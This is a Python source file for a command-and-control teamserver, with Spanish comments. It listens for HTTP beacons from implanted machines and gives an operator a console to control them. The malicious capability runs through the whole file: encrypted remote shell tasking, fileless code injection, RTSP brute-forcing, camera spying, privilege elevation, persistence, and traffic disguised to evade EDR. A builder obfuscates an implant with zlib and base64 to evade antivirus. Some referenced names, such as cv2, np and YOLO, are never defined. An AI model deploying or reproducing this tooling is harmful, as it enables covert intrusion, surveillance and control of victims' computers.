"""
╔══════════════════════════════════════════════════════════════╗
║        C2 SERVER v2 - TEAMSERVER & HTTP BEACON MANAGER       ║
╚══════════════════════════════════════════════════════════════╝
"""
import sys
import threading
import json
import base64
import os
import platform
import uuid
from datetime import datetime
from urllib.parse import urlparse, parse_qs, unquote
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.completion import NestedCompleter
    from prompt_toolkit.formatted_text import HTML
    from prompt_toolkit.history import InMemoryHistory
except ImportError:
    print("[!] prompt_toolkit no está instalado. Instálalo con 'pip install prompt_toolkit'")
    sys.exit(1)

try:
    import colorama
    from colorama import Fore, Style
    colorama.init()
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    RESET = Style.RESET_ALL
except ImportError:
    RED = GREEN = YELLOW = CYAN = RESET = ""

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
    import hashlib
    AES_AVAILABLE = True
except ImportError:
    AES_AVAILABLE = False
    print("[!] pycryptodome no instalado. Usando XOR.")

HOST = '192.168.56.1'
PORT = 4444
AES_KEY = b'C2ProjectEduKey2024!SecureKey32b'

# Base de datos global en memoria
agentes_activos = {}      # {id: {'info': {}, 'last_seen': t, 'aes_key': b}}
tareas_pendientes = {}    # {id: [ {task_id, payload_dict} ]}
resultados_tareas = {}    # {task_id: result_dict}

DB_FILE = "c2_database.json"

def save_state():
    state = {}
    for a_id, data in agentes_activos.items():
        state[a_id] = {
            'info': data['info'],
            'last_seen': data['last_seen'].isoformat() if isinstance(data['last_seen'], datetime) else data['last_seen'],
            'aes_key': data['aes_key'].hex() if isinstance(data['aes_key'], bytes) else data['aes_key'],
            'ip': data.get('ip', 'N/A'),
            'hostname': data.get('hostname', 'Unknown')
        }
    with open(DB_FILE, 'w') as f:
        json.dump(state, f)

def load_state():
    global agentes_activos
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                state = json.load(f)
            for a_id, data in state.items():
                data['aes_key'] = bytes.fromhex(data['aes_key'])
                data['last_seen'] = datetime.fromisoformat(data['last_seen'])
                agentes_activos[a_id] = data
        except Exception:
            pass

class AESCipher:
    def __init__(self, key: bytes = AES_KEY):
        if AES_AVAILABLE:
            self.key = hashlib.sha256(key).digest() if len(key) != 32 else key
            
    def encrypt(self, plaintext: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in plaintext])
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        return base64.b64encode(iv + ciphertext)
    
    def decrypt(self, encrypted_data: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in encrypted_data])
        raw = base64.b64decode(encrypted_data)
        cipher = AES.new(self.key, AES.MODE_CBC, raw[:16])
        return unpad(cipher.decrypt(raw[16:]), AES.block_size)

aes = AESCipher()

class C2HTTPRequestHandler(BaseHTTPRequestHandler):
    def end_headers(self):
        # Evadimos heurísticas de EDR devolviendo headers web típicos
        self.send_header('Server', 'nginx/1.18.0')
        super().end_headers()

    def extract_agent_id(self):
        # Malleable C2: Busca la ID en la Cookie "session_id=" en vez de GET ?id=
        cookies = self.headers.get('Cookie', '')
        for c in cookies.split(';'):
            if 'session_id=' in c:
                return unquote(c.split('session_id=')[1].strip())
        # Fallback a URL estandar si falla Malleable
        query = parse_qs(urlparse(self.path).query)
        if 'id' in query: return query['id'][0]
        return None

    def do_GET(self):
        """Malleable GET: Captura telemetría encubierta"""
        parsed_path = urlparse(self.path)
        
        # Atiende tanto la ruta antigua como la Malleable
        if parsed_path.path in ['/poll', '/api/v2/telemetry']:
            agent_id = self.extract_agent_id()
            
            if agent_id:
                # Actualizar last_seen
                if agent_id not in agentes_activos:
                    agentes_activos[agent_id] = {'last_seen': datetime.now(), 'info': {}, 'aes_key': AES_KEY}
                    print(f"\n{GREEN}[+] BEACON RECUPERADO O VISTO (GET): {agent_id}{RESET}")
                    save_state()
                agentes_activos[agent_id]['last_seen'] = datetime.now()
                
                # Check si hay tareas
                if agent_id in tareas_pendientes and len(tareas_pendientes[agent_id]) > 0:
                    tarea = tareas_pendientes[agent_id].pop(0)
                    
                    # Preparar payload
                    payload_str = json.dumps({
                        'command': tarea['command'],
                        'args': tarea['args'],
                        'task_id': tarea['task_id'],
                        **tarea.get('extra', {})
                    }).encode('utf-8')
                    
                    encrypted = aes.encrypt(payload_str)
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(encrypted)
                    return
            
            # Si no hay tareas, responder vacío rapido
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b"")
            return
            
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        """Malleable POST: Maneja las respuestas ocultas"""
        parsed_path = urlparse(self.path)
        if parsed_path.path in ['/submit', '/api/v2/update']:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = parse_qs(post_data)
            
            # Buscar el campo Malleable primero, sino fallback al estandar
            encoded_payload = None
            if '__VIEWSTATE' in parsed_data:
                encoded_payload = parsed_data['__VIEWSTATE'][0]
            elif 'data' in parsed_data:
                encoded_payload = parsed_data['data'][0]
                
            if encoded_payload:
                try:
                    decrypted = aes.decrypt(encoded_payload)
                    result = json.loads(decrypted.decode('utf-8'))
                    
                    agent_id = result.get('id')
                    task_id = result.get('task_id')
                    
                    if agent_id and agent_id in agentes_activos:
                        agentes_activos[agent_id]['last_seen'] = datetime.now()
                        
                    # Procesar info autonoma (ej. registro)
                    if task_id == 'register' and 'info' in result:
                        if agent_id not in agentes_activos:
                            agentes_activos[agent_id] = {'last_seen': datetime.now(), 'info': {}, 'aes_key': AES_KEY}
                            print(f"\n{GREEN}[+] NUEVO BEACON REGISTRADO: {agent_id}{RESET}")
                        agentes_activos[agent_id]['info'] = result['info']
                        save_state()
                    else:
                        # Guardar resultado para que el operador lo lea
                        
                        # Si es vision_frame procesamos la IA antes de guadar
                        if 'vision_frame' in result:
                            print(f"\n[*] [Recibió frame visual de {agent_id}]. Procesando IA localmente...")
                            self.process_vision_frame(result, agent_id)
                        else:
                            resultados_tareas[task_id] = result
                            print(f"\n[*] [Recibió tarea de BEACON {agent_id}] -> Ejecute 'results' para ver.")
                        
                except Exception as e:
                    print(f"[-] Error desencriptando POST: {e}")
                    
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b"OK")
            return
            
        self.send_response(404)
        self.end_headers()

    # Ocultar logs locales
    def log_message(self, format, *args):
        return
        
    def process_vision_frame(self, result, agent_id):
        try:
            b64_data = result['vision_frame']
            target = result.get('target', 'unknown')
            
            padding = 4 - (len(b64_data) % 4)
            if padding != 4: b64_data += '=' * padding
                
            img_data = base64.b64decode(b64_data)
            nparr = np.frombuffer(img_data, np.uint8)
            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            
            os.makedirs(os.path.join(FILE_TRANSFER_DIR, 'detections'), exist_ok=True)
            filename = f"vision_{agent_id}_{datetime.now().strftime('%H%M%S')}.jpg"
            filepath = os.path.join(FILE_TRANSFER_DIR, 'detections', filename)
            
            if YOLO_AVAILABLE:
                # Cargar el modelo si no está en memoria
                if not hasattr(self, 'yolo_model'):
                    self.yolo_model = YOLO('yolov8n.pt')
                    
                results = self.yolo_model(frame, verbose=False)
                detected = []
                for box in results[0].boxes:
                    cls_name = self.yolo_model.names[int(box.cls[0])]
                    detected.append(f"{cls_name}({float(box.conf[0]):.2f})")
                    
                res_plotted = results[0].plot()
                cv2.imwrite(filepath, res_plotted)
                
                if detected:
                    print(f"\n[!!] YOLO DETECTÓ ({target}): {', '.join(detected)}")
                else:
                    print(f"\n[-] YOLO no detectó relevancia en {target}.")
                print(f"[+] Evidencia en: {filepath}")
            else:
                cv2.imwrite(filepath, frame)
                print(f"[+] Frame RAW guardado en {filepath}")
                
        except Exception as e:
            print(f"[-] Error en vision: {e}")

class InteractiveConsole:
    def __init__(self):
        self.running = True

    def queue_task(self, agent_id, command, args="", extra=None):
        if agent_id not in tareas_pendientes:
            tareas_pendientes[agent_id] = []
        task_id = str(uuid.uuid4())[:8]
        task = {'command': command, 'args': args, 'task_id': task_id, 'extra': extra or {}}
        tareas_pendientes[agent_id].append(task)
        print(f"[*] Tarea encolada [{task_id}]. Esperando check-in de {agent_id}...")
        return task_id

    def list_beacons(self):
        print("\n=== BEACONS ACTIVOS ===")
        if not agentes_activos: print("No hay beacons registrados.")
        for agent_id, data in agentes_activos.items():
            info = data['info']
            hostname = info.get('hostname', 'Unknown')
            user = info.get('username', 'Unknown')
            last_dt = data['last_seen'].strftime('%Y-%m-%d %H:%M:%S')
            print(f"[{agent_id}] -> {user}@{hostname} | Last Check-in: {last_dt}")

    def load_module_fileless(self, agent_id, module_name):
        """Lee archivo y manda inyeccion RAM"""
        filepath = os.path.join(os.getcwd(), 'modules', f'{module_name}.py')
        if not os.path.exists(filepath):
            print(f"[-] El módulo no existe: {filepath}")
            return
            
        with open(filepath, 'r', encoding='utf-8') as f:
            code = f.read()
            
        self.queue_task(agent_id, 'inject', args=module_name, extra={'fileless_script': code})
        print(f"[*] Código fuente pre-cargado. Se inyectará en la memoria RAM (Fileless) del Agente: {agent_id}")

    def build_completer(self, current_agent):
        agentes_ids = {a: None for a in agentes_activos.keys()}
        modulos = {'network_sweeper': None, 'stream_capture': None, 'uac_bypass': None}
        
        diccionario = {
            'beacons': None,
            'use': agentes_ids,
            'interact': agentes_ids,
            'results': None,
            'generate': None,
            'exit': None
        }
        
        if current_agent:
            diccionario.update({
                'shell': None,
                'inject': modulos,
                'sweep': None,
                'watch': None,
                'sleep': None,
                'persist': None,
                'elevate': None,
                'kill': None,
                'back': None
            })
            
        return NestedCompleter.from_nested_dict(diccionario)

    def print_banner(self):
        banner = f"""{RED}
        ==================================================
           C2 TEAM SERVER V2 (HTTP Beacons & Fileless) 
        =================================================={RESET}
        [*] Listener encendido en http://{HOST}:{PORT}
        [*] Modo: {GREEN}Interactivo{RESET} (Usa TAB para autocompletar)
        """
        print(banner)

    def list_beacons(self):
        print(f"\n{CYAN}--- Beacons Activos ---{RESET}")
        if not agentes_activos:
            print("[-] No hay beacons registrados.")
            return
        
        print(f"{'ID':<15} {'IP':<15} {'Hostname/Host':<20} {'Last Check-In'}")
        print("-" * 70)
        for b_id, b_info in agentes_activos.items():
            dt = b_info.get('last_seen', datetime.now()).strftime("%H:%M:%S")
            print(f"{b_id:<15} {b_info.get('ip', 'N/A'):<15} {b_info.get('hostname', 'Unknown'):<20} {dt}")
        print("-" * 70)

    def loop(self):
        load_state()
        self.print_banner()
        if agentes_activos:
            print(f"{GREEN}[+] Recuperada conexión con {len(agentes_activos)} Beacons desde la Base de Datos.{RESET}")
            
        session = PromptSession(history=InMemoryHistory())
        current_agent = None
        
        while self.running:
            completer = self.build_completer(current_agent)
            
            if current_agent:
                prompt_text = HTML(f"<ansicyan>(C2)</ansicyan> [<ansired>{current_agent}</ansired>]> ")
            else:
                prompt_text = HTML("<ansicyan>(C2)</ansicyan>> ")
                
            try:
                cmd_raw = session.prompt(prompt_text, completer=completer).strip()
                if not cmd_raw: continue
                parts = cmd_raw.split(" ", 1)
                cmd = parts[0]
                args = parts[1] if len(parts) > 1 else ""
                
                if cmd == 'exit':
                    print(f"{RED}[!] Cerrando servidor C2...{RESET}")
                    os._exit(0)
                elif cmd == 'beacons':
                    self.list_beacons()
                elif cmd == 'use':
                    if args in agentes_activos:
                        current_agent = args
                        print(f"{GREEN}[+] Interaccionando con Beacon: {current_agent}{RESET}")
                    else:
                        print(f"{RED}[-] Agente no encontrado.{RESET}")
                elif cmd == 'results':
                    if not resultados_tareas: print(f"{YELLOW}[-] No hay resultados nuevos.{RESET}")
                    for tid, res in list(resultados_tareas.items()):
                        print(f"\n{CYAN}--- Resultado Tarea [{tid}] ---{RESET}")
                        if 'output' in res: print(res['output'])
                        if 'error' in res: print(f"{RED}{res['error']}{RESET}")
                        if 'vision_frame' in res: print(f"{GREEN}[+] Frame Capturado y Procesado por YOLO (Revisa Logs/Transfers){RESET}")
                        del resultados_tareas[tid] # limpiar buffer
                elif cmd == 'help':
                    print(f"\n{CYAN}[ COMANDOS GLOBALES ]{RESET}")
                    print("  beacons     - Mostrar lista de Agentes y su último ping")
                    print("  use <id>    - Controlar a un Agente específico")
                    print("  interact <id>- Iniciar Shell Interactiva Constante PTY con el Agente")
                    print("  generate    - Auto-construir payload de Agente Fileless/Windowless")
                    print("  results     - Leer respuestas asíncronas de los Agentes")
                    print("  exit        - Apagar Servidor C2")
                    print(f"\n{CYAN}[ COMANDOS DE SESIÓN (Requiere hacer 'use') ]{RESET}")
                    print("  shell <cmd> - Lanza un comando de terminal víctima")
                    print("  inject <mod>- Sube Fileless un script (Ej: inject network_sweeper)")
                    print("  sweep <net> - Fuerza Bruta RTSP (Ej: sweep 192.168.1.0/24)")
                    print("  watch <url> - Espionaje IA Analizando Video de Cámara Obtenida")
                    print("  elevate     - Escalar privilegios a Admin vía Registro")
                    print("  persist     - Anclar persistencia en el equipo víctima (Auto-Run)")
                    print("  sleep <s/j> - Regular los pings y el Jittering del Beacon")
                    print("  kill        - Auto-destrucción y limpieza forense de la infección")
                    print("  back        - Salir de la sesión y volver al Servidor C2\n")
                elif cmd == 'back':
                    current_agent = None
                elif cmd == 'generate':
                    import re
                    agent_file = 'agent_v2.py'
                    output_file = 'transfers/implant_auto.pyw'
                    if not os.path.exists('transfers'): os.makedirs('transfers')
                    
                    try:
                        with open(agent_file, 'r', encoding='utf-8') as f:
                            code = f.read()
                        
                        target_url = f"http://{HOST}:{PORT}"
                        # Reemplazar la URL
                        code = re.sub(r'C2_URL\s*=\s*".*"', f'C2_URL = "{target_url}"', code)
                        
                        import zlib, base64
                        obfuscated = base64.b64encode(zlib.compress(code.encode('utf-8'))).decode()
                        final_code = f"import base64, zlib; exec(zlib.decompress(base64.b64decode('{obfuscated}')).decode('utf-8'))"
                        
                        with open(output_file, 'w', encoding='utf-8') as f:
                            f.write(final_code)
                            
                        print(f"{GREEN}[+] Auto-Builder Completo. Archivo generado en: {output_file}{RESET}")
                        print(f"{YELLOW}[*] El código fuente fue ofuscado (ZLIB+B64) para evadir análisis estático AV.{RESET}")
                        print(f"{YELLOW}[*] El formato .pyw asegura que al ejecutarse en Windows NO se abra consola visible.{RESET}")
                    except Exception as e:
                        print(f"{RED}[-] Error generando payload: {e}{RESET}")
                elif cmd == 'interact':
                    if args in agentes_activos:
                        print(f"{CYAN}--- INICIANDO PTY SHELL INTERACTIVA CON {args} ---{RESET}")
                        print(f"{YELLOW}[*] Escribe 'exit' para salir o 'background' para soltar la terminal.{RESET}")
                        while True:
                            try:
                                sh_cmd = session.prompt(HTML(f"<ansired>PTY [{args}]></ansired> ")).strip()
                                if not sh_cmd: continue
                                if sh_cmd in ['exit', 'background']: break
                                
                                # Encola la shell
                                self.queue_task(args, 'shell', sh_cmd)
                                sys.stdout.write(f"{YELLOW}[*] Procesando...{RESET}")
                                sys.stdout.flush()
                                
                                # Bucle de espera sincrona forzada para fingir PTY
                                import time
                                start_t = time.time()
                                found = False
                                while time.time() - start_t < 15:
                                    # Hack para capturar la respuesta
                                    for tid, res in list(resultados_tareas.items()):
                                        if 'output' in res or 'error' in res:
                                            sys.stdout.write("\r" + " " * 30 + "\r")
                                            if 'output' in res: print(res['output'].strip())
                                            if 'error' in res: print(f"{RED}{res['error'].strip()}{RESET}")
                                            del resultados_tareas[tid]
                                            found = True
                                            break
                                    if found: break
                                    time.sleep(0.5)
                                    
                                if not found:
                                    print(f"\n{RED}[-] Timeout de PTY. El comando puede seguir ejecutándose asíncronamente.{RESET}")
                            except KeyboardInterrupt:
                                break
                    else:
                        print(f"{RED}[-] Agente no encontrado para interactuar.{RESET}")
                    
                # Comandos en sesión agente
                elif current_agent:
                    if cmd == 'shell':
                        self.queue_task(current_agent, 'shell', args)
                        print(f"{YELLOW}[*] Instrucción enviada al Beacon... usa 'results' para ver la salida.{RESET}")
                    elif cmd == 'inject':
                        self.load_module_fileless(current_agent, args)
                    elif cmd == 'sweep':
                        self.queue_task(current_agent, 'sweep', args)
                    elif cmd == 'watch':
                        self.queue_task(current_agent, 'watch', args)
                    elif cmd == 'persist':
                        self.queue_task(current_agent, 'persist')
                    elif cmd == 'sleep':
                        self.queue_task(current_agent, 'sleep', args)
                    elif cmd == 'kill':
                        choice = session.prompt(HTML(f"<ansired>[!] ATENCIÓN: El agente se borrará a sí mismo y dejará de funcionar. ¿Seguro? (s/N) </ansired>")).strip().lower()
                        if choice in ['s', 'y', 'yes', 'si']:
                            self.queue_task(current_agent, 'kill')
                            if current_agent in agentes_activos:
                                del agentes_activos[current_agent]
                                save_state()
                            current_agent = None
                            print(f"{RED}[+] Kill enviado. Descartando sesión y borrando de la BD.{RESET}")
                    elif cmd == 'elevate':
                        self.queue_task(current_agent, 'elevate')
                    else:
                        print(f"{RED}[-] Comando no reconocido. Pulsa TAB para ver opciones.{RESET}")
                else:
                    if cmd not in ['beacons', 'use', 'results', 'exit']:
                        print(f"{RED}[-] Selecciona un beacon primero con 'use <id>'{RESET}")
                    
            except KeyboardInterrupt:
                pass
            except EOFError:
                break

def start_http():
    server = HTTPServer((HOST, PORT), C2HTTPRequestHandler)
    server.serve_forever()

if __name__ == '__main__':
    # Lanzar HTTP Server en hilo propio
    t = threading.Thread(target=start_http, daemon=True)
    t.start()
    
    # Arrancar Consola Intercativa en hilo main
    console = InteractiveConsole()
    console.loop()
